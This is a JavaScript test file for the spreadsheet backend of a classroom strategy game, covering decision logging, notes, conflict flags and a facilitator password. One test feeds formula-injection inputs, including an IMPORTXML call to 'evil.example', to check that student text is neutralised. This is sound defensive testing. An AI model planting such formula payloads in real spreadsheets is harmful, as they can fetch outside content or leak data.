import test from 'node:test';
import assert from 'node:assert/strict';
import { CONFIG, WORKSHEET } from '../src/scenario.mjs';
import { makeRoom, marketForTable, validateRecord, problemFor } from '../src/rules.mjs';
import { buildEvents } from '../src/sync.mjs';
import { createBackend } from '../scripts/fake-google.mjs';

const start = Date.parse("2026-11-14T18:30:00+03:00");
const room = makeRoom(start, 0, "ABC");
const at = minutes => new Date(start + minutes * 60_000).toISOString();
const TOKEN = "correct horse battery";

function record(team, choices, methods = {}) {
  const market = marketForTable(room, team);
  const history = choices.map((choice, index) => ({
    // A default or a deadline decision is recorded at the end of its round; a decision made by the team earlier.
    round: "R" + (index + 1), choice, method: methods[index] ?? "submitted",
    at: at((methods[index] ?? "submitted") === "submitted" ? [5, 20, 40, 55, 75, 95, 110][index] : [16, 32, 50, 60, 84, 104, 119][index]),
    evidence: "evidence " + (index + 1), tradeoff: "trade-off " + (index + 1),
    ...(index === 5 && choice === "targeted" ? {problem: problemFor(market, choices[0])} : {})
  }));
  return validateRecord({game: CONFIG.game, version: CONFIG.version, mode: "live", team, market, room, session: "s" + team, history, drafts: {}, notes: {}, brief: "", bulletinB: false});
}
const decisions = (events, sentAt = Date.now()) => JSON.stringify({v: 1, sentAt: new Date(sentAt).toISOString(), clockOffsetMs: 0, events});
const send = (backend, events, sentAt) => JSON.parse(backend.handle("POST", "/", decisions(events, sentAt)).body);
const notesFor = (team, items, brief) => JSON.stringify({v: 1, type: "notes", room, team, market: marketForTable(room, team), session: "s" + team, sentAt: new Date().toISOString(), items, ...(brief ? {brief} : {})});
const sendNotes = (backend, team, items, brief) => JSON.parse(backend.handle("POST", "/", notesFor(team, items, brief)).body);
const get = (backend, query) => JSON.parse(backend.handle("GET", "/?" + query).body);
const note = (round, field, text, minutes = 10) => ({round, field, text, at: new Date(Date.now() + minutes * 1000).toISOString()});

test("The script knows exactly the worksheet fields of the game", () => {
  const backend = createBackend();
  const fields = JSON.parse(JSON.stringify(backend.script.ROUND_FIELDS));
  assert.deepEqual(fields, Object.fromEntries(Object.entries(WORKSHEET).map(([round, list]) => [round, list.map(([field]) => field)])));
  for (const list of Object.values(WORKSHEET)) for (const [field, label] of list) assert.equal(backend.script.FIELD_LABELS[field], label, field);
  assert.equal(backend.script.NOTES_TOTAL, Object.values(WORKSHEET).reduce((sum, list) => sum + list.length, 0));
});

test("Decisions are stored in the raw log with the problem and the game result, and re-sent events are duplicates", () => {
  const backend = createBackend();
  const events = buildEvents(record(1, ["A", "desk", "pilot", "verify", "narrow", "targeted", "pilot"]));
  const first = send(backend, events);
  assert.equal(first.saved.length, 7);
  const rows = backend.table("Decisions");
  assert.equal(rows.length, 7);
  assert.equal(rows[5].problem, problemFor(marketForTable(room, 1), "A"), "the named problem is kept");
  assert.equal(rows[6].game, events[6].game);
  assert.ok(Number(rows[6].game) > 0);
  assert.equal(rows[0].received_at instanceof Date, true, "Google's clock stamps the row");
  const again = send(backend, events);
  assert.equal(again.saved.length, 0);
  assert.equal(again.duplicates.length, 7);
  assert.equal(backend.table("Decisions").length, 7);
});

test("The Progress sheet shows where each team is, its credits and what it chose, one row per team", () => {
  const backend = createBackend();
  send(backend, buildEvents(record(1, ["A", "desk", "pilot"])));
  send(backend, buildEvents(record(2, ["B", "desk"], {1: "default"})));
  let progress = backend.table("Progress");
  assert.equal(progress.length, 2);
  const [one, two] = progress;
  assert.equal(one.stage, "R4 · Readiness (3 of 7 decided)");
  assert.deepEqual([one.R1, one.R2, one.R3, one.R4], ["A", "desk", "pilot", ""]);
  assert.equal(two.stage, "R3 · Entry route (2 of 7 decided)");
  assert.equal(two.R2, "desk *", "a default is marked with a star");
  assert.equal(two.credits_left, 9);

  // More events move the same row instead of adding a new one.
  send(backend, buildEvents(record(1, ["A", "desk", "pilot", "reserve"])));
  progress = backend.table("Progress");
  assert.equal(progress.length, 2);
  assert.equal(progress.find(row => row.team === 1).stage, "R5 · Competition (4 of 7 decided)");
});

test("A finished team shows its game result in Progress", () => {
  const backend = createBackend();
  const full = record(1, ["A", "desk", "pilot", "verify", "narrow", "targeted", "pilot"]);
  send(backend, buildEvents(full));
  const [row] = backend.table("Progress");
  assert.equal(row.stage, "Finished");
  assert.equal(row.game_result, buildEvents(full)[6].game);
});

test("Each round has its own sheet where all four teams can be compared side by side", () => {
  const backend = createBackend();
  const choices = {1: "desk", 2: "interview", 3: "prototype", 4: "desk"};
  for (const team of [1, 2, 3, 4]) send(backend, buildEvents(record(team, ["A", choices[team]])));
  const r2 = backend.table("R2");
  assert.equal(r2.length, 4);
  assert.deepEqual(r2.map(row => row.team).sort(), [1, 2, 3, 4]);
  const byTeam = Object.fromEntries(r2.map(row => [row.team, row]));
  assert.equal(byTeam[2].choice, "interview");
  assert.equal(byTeam[2].cost, 2);
  assert.equal(byTeam[3].cost, 3);
  assert.equal(byTeam[3].credits_left, 6);
  assert.equal(byTeam[1].evidence, "evidence 2");
  assert.equal(byTeam[1].tradeoff, "trade-off 2");
  assert.equal(byTeam[1].status, "locked by the team");
  assert.equal(byTeam[1].market, marketForTable(room, 1));
  assert.equal(backend.table("R3").length, 0, "a round nobody has reached stays empty");
});

test("Worksheet notes arrive per field, the newest wins, and they appear in the round sheet and in Progress", () => {
  const backend = createBackend();
  send(backend, buildEvents(record(1, ["A", "desk"])));
  const saved = sendNotes(backend, 1, [note("R1", "proposition", "Frequent travellers", 1), note("R1", "cage", "Two differences", 1), note("R2", "alternatives", "Mandiri vs BCA", 1)]);
  assert.equal(saved.saved, 3);
  let r1 = backend.table("R1")[0];
  assert.equal(r1.proposition, "Frequent travellers");
  assert.equal(r1.cage, "Two differences");
  assert.equal(r1.cultural, "");
  assert.equal(backend.table("R2")[0].alternatives, "Mandiri vs BCA");
  assert.match(backend.table("Progress")[0].notes_filled, /^3 of 17$/);

  // A newer version replaces the text; an older one that arrives late is ignored.
  const newer = sendNotes(backend, 1, [note("R1", "proposition", "Frequent travellers, one corridor", 30)]);
  assert.equal(newer.saved, 1);
  const older = sendNotes(backend, 1, [note("R1", "proposition", "old text", 5)]);
  assert.equal(older.saved, 0);
  assert.equal(older.ignored, 1);
  r1 = backend.table("R1")[0];
  assert.equal(r1.proposition, "Frequent travellers, one corridor");
  assert.equal(backend.table("Notes").length, 3, "one stored row per field");
});

test("Notes before the first decision still create the team's row, and unknown fields are rejected", () => {
  const backend = createBackend();
  const result = sendNotes(backend, 3, [note("R1", "proposition", "early idea"), note("R9", "x", "no"), note("R1", "nonsense", "no")]);
  assert.equal(result.saved, 1);
  assert.equal(result.rejected.length, 2);
  const row = backend.table("R1")[0];
  assert.equal(row.status, "waiting");
  assert.equal(row.proposition, "early idea");
  assert.equal(backend.table("Progress")[0].stage, "Not started");
});

test("The Board Brief has its own sheet and its length is shown", () => {
  const backend = createBackend();
  send(backend, buildEvents(record(1, ["A"])));
  sendNotes(backend, 1, [], {text: "Fund the pilot in Jakarta because…", at: new Date().toISOString()});
  const [brief] = backend.table("Brief");
  assert.equal(brief.brief, "Fund the pilot in Jakarta because…");
  assert.equal(brief.characters, "Fund the pilot in Jakarta because…".length);
  assert.match(backend.table("Progress")[0].notes_filled, /· brief$/);
});

test("A rewritten round adds a flagged row, and both the round sheet and Progress say so", () => {
  const backend = createBackend();
  const honest = buildEvents(record(1, ["A", "desk"]));
  send(backend, honest);
  const forged = buildEvents(record(1, ["A", "prototype"]));
  send(backend, forged);
  const log = backend.table("Decisions").filter(row => row.round === "R2");
  assert.equal(log.length, 2);
  assert.match(log[1].flags, /CONFLICT/);
  const r2 = backend.table("R2");
  assert.equal(r2.length, 1, "the round sheet keeps one row per team");
  assert.equal(r2[0].choice, "desk", "the first recorded decision stays authoritative");
  assert.match(r2[0].flags, /CONFLICT: 1 more record/);
  assert.match(backend.table("Progress")[0].flags, /flagged/);
});

test("A device clock far from Google is flagged in the log", () => {
  const backend = createBackend();
  send(backend, buildEvents(record(1, ["A"])), Date.now() - 10 * 60_000);
  assert.match(backend.table("Decisions")[0].flags, /CLOCK/);
});

test("Student text can never become a spreadsheet formula, and long text is cut", () => {
  const backend = createBackend();
  const [event] = buildEvents(record(1, ["A"]));
  send(backend, [{...event, evidence: '=IMPORTXML("https://evil.example","//x")', tradeoff: "+SUM(1)", label: "@cmd"}]);
  const row = backend.table("Decisions")[0];
  for (const column of ["evidence", "tradeoff", "label"]) assert.ok(row[column].startsWith("'"), column);
  sendNotes(backend, 1, [note("R1", "proposition", "=HYPERLINK(\"x\")"), note("R1", "cage", "x".repeat(5000))]);
  const r1 = backend.table("R1")[0];
  assert.ok(r1.proposition.startsWith("'"));
  assert.equal(r1.cage.length, 1800);
});

test("Malformed requests are rejected without breaking the sheets", () => {
  const backend = createBackend();
  const [good, second] = buildEvents(record(1, ["A", "desk"]));
  const bad = [{...good, room: "NOPE"}, {...good, team: 9}, {...good, round: "R9"}, {...good, method: "cheat"}, {...good, seq: 3}, {...good, chain: "short"}, {...good, id: "other:1:0:abcdefghijk"}, null];
  const result = send(backend, [...bad, second]);
  assert.equal(result.rejected.length, bad.length);
  assert.equal(result.saved.length, 1);
  assert.equal(JSON.parse(backend.handle("POST", "/", "not json").body).ok, false);
  assert.equal(JSON.parse(backend.handle("POST", "/", JSON.stringify({v: 2, events: [good]})).body).ok, false);
  assert.equal(JSON.parse(backend.handle("POST", "/", JSON.stringify({v: 1, type: "notes", room: "x", team: 1, items: []})).body).ok, false);
});

test("A team can read back its own decisions and notes to continue on another device", () => {
  const backend = createBackend();
  send(backend, buildEvents(record(2, ["B", "interview", "alliance"])));
  sendNotes(backend, 2, [note("R3", "early", "Month 0-3: sign the partner")], {text: "brief text", at: new Date().toISOString()});
  const data = get(backend, `action=team&room=${room}&team=2`);
  assert.equal(data.ok, true);
  assert.deepEqual(data.decisions.map(item => item.choice), ["B", "interview", "alliance"]);
  assert.equal(data.decisions[1].evidence, "evidence 2");
  assert.equal(data.decisions[0].at, at(5), "the original time of the decision comes back");
  assert.deepEqual(data.notes.map(item => `${item.round}.${item.field}=${item.text}`), ["R3.early=Month 0-3: sign the partner"]);
  assert.equal(data.brief.text, "brief text");
  assert.equal(get(backend, `action=team&room=${room}&team=4`).decisions.length, 0);
  assert.equal(get(backend, "action=team&room=NOPE&team=1").ok, false);
  assert.equal(get(backend, `action=team&room=${room}&team=9`).ok, false);
});

test("The facilitator reads the whole room with the password, and only then", () => {
  const backend = createBackend();
  send(backend, buildEvents(record(1, ["A", "desk"])));
  send(backend, buildEvents(record(3, ["B"])));
  assert.match(get(backend, `action=room&room=${room}&token=${TOKEN}`).error, /password is not set/);
  backend.setToken(TOKEN);
  assert.match(get(backend, `action=room&room=${room}&token=wrong`).error, /Wrong facilitator password/);
  assert.match(get(backend, `action=room&room=${room}`).error, /Wrong facilitator password/);
  const data = get(backend, `action=room&room=${room}&token=${encodeURIComponent(TOKEN)}`);
  assert.equal(data.ok, true);
  assert.deepEqual(data.teams.map(team => team.decisions.length), [2, 0, 1, 0]);
  assert.equal(data.teams[0].market, marketForTable(room, 1));
});

test("The room and start time are set by the facilitator and read by the teams", () => {
  const backend = createBackend({token: TOKEN});
  assert.deepEqual(get(backend, "action=config"), {ok: true, room: "", start: ""});
  const post = body => JSON.parse(backend.handle("POST", "/", JSON.stringify(body)).body);
  assert.match(post({v: 1, type: "room", token: "wrong", room, start: at(0)}).error, /Wrong facilitator password/);
  assert.equal(post({v: 1, type: "room", token: TOKEN, room: "NOPE", start: at(0)}).ok, false);
  assert.equal(post({v: 1, type: "room", token: TOKEN, room, start: at(0)}).ok, true);
  const config = get(backend, "action=config");
  assert.equal(config.room, room);
  assert.equal(config.start, new Date(start).toISOString());
});

test("Starting a new session saves a copy and clears the data but keeps the headers", () => {
  const backend = createBackend();
  send(backend, buildEvents(record(1, ["A", "desk"])));
  backend.script.SpreadsheetApp = undefined;
  assert.equal(backend.table("Decisions").length, 2);
  assert.ok(backend.spreadsheet.getSheetByName("Progress"));
  assert.ok(["Decisions", "Notes", "Progress", "Brief", "Settings", "R1", "R2", "R3", "R4", "R5", "R6", "R7"].every(name => backend.spreadsheet.getSheetByName(name)));
});
